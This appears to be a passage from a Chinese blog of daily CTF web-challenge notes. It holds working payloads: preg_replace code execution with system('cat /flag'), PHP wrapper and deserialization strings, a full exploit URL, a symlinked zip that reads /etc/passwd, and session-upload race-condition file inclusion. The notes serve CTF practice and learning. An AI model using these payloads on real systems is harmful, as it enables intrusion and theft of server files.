class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>有关 return preg_replace(…)没看懂</p>
<hr>
<h5 id="知识点理解：-1"><a href="#知识点理解：-1" class="headerlink" title="知识点理解："></a>知识点理解：</h5><p>  主要是preg_replace e模式下的代码执行问题.</p>
<p><code> &#39;strtolower(&quot;\\1&quot;)&#39;,</code> 里面的<code>\\1</code>实际就是\1,在正则匹配中即指第一个子匹配项</p>
<p>官方payload：/?.*={${phpinfo}}, </p>
<p><code>/.*=&#123;&#123;&#125;&#125;会变成 /_*</code>是非法字符不为首字母，</p>
<p>所以换个正则表达式   <strong>\S*=${phpinfo()}</strong> 可执行函数</p>
<p><a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html">正则表达式</a></p>
<p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p>
<p><a href="https://blog.csdn.net/satasun/article/details/109456347">参考wp</a></p>
<hr>
<h5 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo&#125; 或者  \S*&#x3D;&#123;$&#123;phpinfo&#125;&#125;   &#x2F;&#x2F; 可以命令执行</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/3.png" alt="4"></p>
<blockquote>
<p>/next.php?S*=${getFlag()}&amp;cmd=system(‘cat /flag’);</p>
</blockquote>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/4.png" alt="3"></p>
<hr>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ul>
<li>2021.5.24</li>
</ul>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.5.24/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123; </span><br></pre></td></tr></table></figure>

<p>第一关我们可以通过php 伪协议传参welcome to the zjctf。  php://input  或者   data:// 都可以</p>
<ul>
<li>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include($file);  &#x2F;&#x2F;useless.php </span><br></pre></td></tr></table></figure>

<p>第二关这么明显的提示，我们赶快去读useless.php 内容（在第一关的基础上）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>

<p>获得一串base64加密数据PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</p>
<p>解密得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.5.24/2.png" alt="2"></p>
<p><a href="http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
<p>F12获得flag</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><ul>
<li>2021.7.21</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code>   php强比较绕过</p>
</li>
</ol>
<p><code>id[]=1&amp;gg[]=2</code>，传入数组，虽然会报错但md5返回结果为空，NULL=NULL绕过md5，</p>
<ol start="2">
<li>is_numeric()函数用1234567a绕过，1234567a会被当做字符串，转换整型时候把a去掉</li>
</ol>
<h2 id="MRCTF2020-套娃1"><a href="#MRCTF2020-套娃1" class="headerlink" title="[MRCTF2020]套娃1"></a>[MRCTF2020]套娃1</h2><ul>
<li>2020.7.21</li>
</ul>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721161850938.png" alt="image-20210721161850938"></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>可以获得我们传的参数变量和值，如下解释：</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721162009856.png" alt="image-20210721162009856"></p>
<p><code>%20</code>代替<code>_</code>绕过第一个if检测(查询字符串在解析的过程中会将空白符删除或用将某些字符转换为下划线（包括<code>空格</code>，<code>[</code>）)   或者用<code>%5F</code>代替<code>_</code></p>
<p><a href="https://www.freebuf.com/articles/web/213359.html">参考</a></p>
<p><code>%0a</code>绕过第二个正则（超级实用）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151026286.png" alt="image-20210723151026286"></p>
<p>jsfuck加密</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151432092.png" alt="image-20210723151432092"></p>
<p>复制到控制台</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151501201.png" alt="image-20210723151501201"></p>
<p>随便post   Merak一个值</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723160659019.png" alt="image-20210723160659019"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? </span><br><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>xff不行，用client-ip:127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure>

<p>file 需要写个解密poc</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015309274.png" alt="image-20210724015309274"></p>
<p>file=ZmpdYSZmXGI=</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015407359.png" alt="image-20210724015407359"></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><ul>
<li>2020.7.22</li>
</ul>
<p><a href="http://120.25.24.45:30194/show_code.php">http://120.25.24.45:30194/show_code.php</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">&#x27;show_code.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$a = @$_GET[<span class="string">&#x27;key1&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">56</span> || $a&gt;<span class="number">256</span>)&#123;             <span class="comment">#key1</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;真相???&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(chr($a)===<span class="string">&quot;8&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;接着&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> $flag1 . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不太行&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = $_GET[<span class="string">&#x27;key2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($b,<span class="string">&#x27;8&#x27;</span>)!==<span class="literal">false</span>)&#123;      <span class="comment">#key2</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不会那么容易的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">1</span>;$i++)&#123;</span><br><span class="line">  ++$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b==<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;祝你好运&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> $flag2 . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;运气不太行呀！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$m = md5($_GET[<span class="string">&#x27;rq&#x27;</span>]);           <span class="comment">#rq</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;fp&#x27;</span>] == $m)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag3.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>($fp))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$n = hash(<span class="string">&#x27;ripemd160&#x27;</span>,$_GET[<span class="string">&#x27;np&#x27;</span>]);   <span class="comment">#np</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;nq&#x27;</span>] === $n)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag4.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>($np))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hell=$_GET[<span class="string">&#x27;key3&#x27;</span>];                  <span class="comment">#key3</span></span><br><span class="line"><span class="keyword">if</span>(strpos($hell, <span class="string">&#x27;i&#x27;</span>)!==<span class="literal">false</span> || strpos($hell, <span class="string">&#x27;I&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不能这样！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$data = unserialize($hell);</span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">&#x27;username&#x27;</span>] == $adminName &amp;&amp; $data[<span class="string">&#x27;password&#x27;</span>] == $adminPassword) &#123;</span><br><span class="line"> <span class="keyword">echo</span> $flag5 . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;没用的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.25.24.45:30194&#x2F;show_code.php?key1&#x3D;56.1%20&amp;key2&#x3D;10-2&amp;rq&#x3D;1&amp;fp&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;np&#x3D;1&amp;nq&#x3D;c47907abd2a80492ca9388b05c0e382518ff3960&amp;key3&#x3D;a:2:&#123;s:8:%22username%22;b:1;s:8:%22password%22;b:1;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="linux软硬链接"><a href="#linux软硬链接" class="headerlink" title="linux软硬链接"></a>linux软硬链接</h2><ul>
<li>2021.9.24</li>
</ul>
<h4 id="索引节点-inode"><a href="#索引节点-inode" class="headerlink" title="索引节点(inode)"></a>索引节点(inode)</h4><p>Linux系统中，内核为每一个新创建的文件分配一个Inode(索引结点)，每个文件都有一个惟一的inode号，文件属性保存在索引结点里，在访问文件时，索引结点被复制到内存，从而实现文件的快速访问。系统是通过索引节点(而不是文件名)来定位每一个文件。</p>
<h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>硬链接说白了是一个指针，指向文件索引节点，系统并不为它重新分配inode。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -li</span><br><span class="line"></span><br><span class="line"># ln命令来建立硬链接</span><br><span class="line">ln [options] existingfile newfile</span><br><span class="line"></span><br><span class="line">[options]:-f无论&quot;newfile&quot;存在与否，都创建链接。-n 如果&quot;newfile&quot;已存在，就不创建链接</span><br></pre></td></tr></table></figure>

<p>特点：</p>
<ol>
<li>注意在创建硬链接前，显示的链接数目为1，创建链接后,链接数目都变为2，具有同样的索引节点号和文件属性。</li>
<li>文件大小一样，可以跨目录，但是只适用于自己的本机的文件系统上。</li>
</ol>
<p>缺点：</p>
<ol>
<li>不可以在<code>不同文件系统</code>的文件间建立链接。</li>
</ol>
<h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>软链接又叫符号链接，这个文件包含了另一个文件的路径名。可以是任意文件或目录，可以链接不同文件系统的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ln -s 命令来建立软链接。</span><br><span class="line">ln -s existingfile newfile</span><br></pre></td></tr></table></figure>

<p>特点：</p>
<ol>
<li>软链接原文件/链接文件拥有不同的inode号，</li>
<li>可以适应其他系统</li>
<li>文件大小是不一样的</li>
</ol>
<hr>
<h4 id="软链接导致任意文件读取"><a href="#软链接导致任意文件读取" class="headerlink" title="软链接导致任意文件读取"></a>软链接导致任意文件读取</h4><p>前提条件：网站后台会解压读取该软链接指向读取目标文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;passwd passwd</span><br><span class="line"></span><br><span class="line">zip -y passwd.zip passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将pass.zip上传导目标服务器</p>
<p>例题babypython[国赛总决赛复现</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180346637.png" alt="image-20210924180346637"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180358924.png" alt="image-20210924180358924"></p>
<p><a href="https://blog.csdn.net/ZXT2804567059/article/details/120031287">例题</a></p>
<p><a href="http://t.zoukankan.com/Silkage-p-13218598.html">参考</a></p>
<hr>
<h2 id="upload-session"><a href="#upload-session" class="headerlink" title="upload-session"></a>upload-session</h2><ul>
<li>2021.9.24</li>
</ul>
<p>php5.4后中添加了session.upload_progress这个功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#php.ini</span><br><span class="line"></span><br><span class="line">1.session.upload_progress.enabled &#x3D; On   #on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line"></span><br><span class="line">2.session.upload_progress.cleanup &#x3D; On   #在读取完POST的数据后,php就会删除session文件中关于上传进度的信息，需要条件竞争绕过。</span><br><span class="line"></span><br><span class="line">3.session.upload_progress.prefix &#x3D; “upload_progress_” #可以设置上传文件内容的前缀</span><br><span class="line"></span><br><span class="line">4.session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS” #name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>当一个上传在处理中，同时POST一个与INI中设置的<a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。  当PHP检测到这种POST请求时，它会在<a href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是  <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a>  与  <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。  通常这些键值可以通过读取INI设置来获得，</p>
<p><strong>session.use_strict_mode</strong>默认值为off，此时用户是可以自己定义Session ID的。</p>
<p>图中PHPSESSID=test，本地文件缓存sess_test文件</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924172910845.png" alt="image-20210924172910845"></p>
<h4 id="session存放地方"><a href="#session存放地方" class="headerlink" title="session存放地方"></a>session存放地方</h4><p>当开启session时，服务器都会在一个临时目录下创建一个session文件来保存会话信息，文件名格式为 sess_PHPSESSID 。</p>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">	$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	highlight_file(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="session内容分析"><a href="#session内容分析" class="headerlink" title="session内容分析"></a>session内容分析</h4><p>PHPSESSID=test，可以生成sess_test文件，<code>111&lt;?php system(&quot;dir&quot;);?&gt;</code>即我们传入的</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924114742991.png" alt="image-20210924114742991"></p>
<p>存入sess_test的内容</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924135912833.png" alt="image-20210924135912833"></p>
<p>内容有两部分，以竖线<code>|</code>区分</p>
<ol>
<li>session.upload_progress.prefix+PHP_SESSION_UPLOAD_PROGRESS</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload_progress_111&lt;?php system(&quot;dir&quot;);?&gt;</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>序列化后的文件传输过程的信息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:5:&#123;s:10:&quot;start_time&quot;;i:1632463087;s:14:&quot;content_length&quot;;i:366;s:15:&quot;bytes_processed&quot;;i:366;s:4:&quot;done&quot;;b:1;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:8:&quot;file.txt&quot;;s:8:&quot;tmp_name&quot;;s:22:&quot;C:\Windows\php8C87.tmp&quot;;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:1;s:10:&quot;start_time&quot;;i:1632463087;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化后，可以清楚看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(5) &#123;</span><br><span class="line">  [&quot;start_time&quot;]&#x3D;&gt;</span><br><span class="line">  int(1632463087)</span><br><span class="line">  [&quot;content_length&quot;]&#x3D;&gt;</span><br><span class="line">  int(366)</span><br><span class="line">  [&quot;bytes_processed&quot;]&#x3D;&gt;</span><br><span class="line">  int(366)</span><br><span class="line">  [&quot;done&quot;]&#x3D;&gt;</span><br><span class="line">  bool(true)</span><br><span class="line">  [&quot;files&quot;]&#x3D;&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [0]&#x3D;&gt;</span><br><span class="line">    array(7) &#123;</span><br><span class="line">      [&quot;field_name&quot;]&#x3D;&gt;</span><br><span class="line">      string(4) &quot;file&quot;</span><br><span class="line">      [&quot;name&quot;]&#x3D;&gt;</span><br><span class="line">      string(8) &quot;file.txt&quot;</span><br><span class="line">      [&quot;tmp_name&quot;]&#x3D;&gt;</span><br><span class="line">      string(22) &quot;C:\Windows\php8C87.tmp&quot;</span><br><span class="line">      [&quot;error&quot;]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">      [&quot;done&quot;]&#x3D;&gt;</span><br><span class="line">      bool(true)</span><br><span class="line">      [&quot;start_time&quot;]&#x3D;&gt;</span><br><span class="line">      int(1632463087)</span><br><span class="line">      [&quot;bytes_processed&quot;]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>利用session.upload_progress上传一个临时文件，</p>
<p>该文件里面有我们上传的恶意代码，然后包含它，</p>
<p>从而执行里面的代码。因为该文件内容清空很快，所以需要不停的上传和包含，在清空之前包含该文件。</p>
<p>竞争条件利用，上传文件要尽量大一些，增加上传时间</p>
<p><a href="https://www.sohu.com/a/314551190_354899">参考</a></p>
<p><a href="https://www.cnblogs.com/hetianlab/p/15266741.html">参考2</a></p>
<p><a href="https://www.cnblogs.com/hetianlab/p/15266741.html">整体思路</a></p>
<p>python的竞争方法</p>
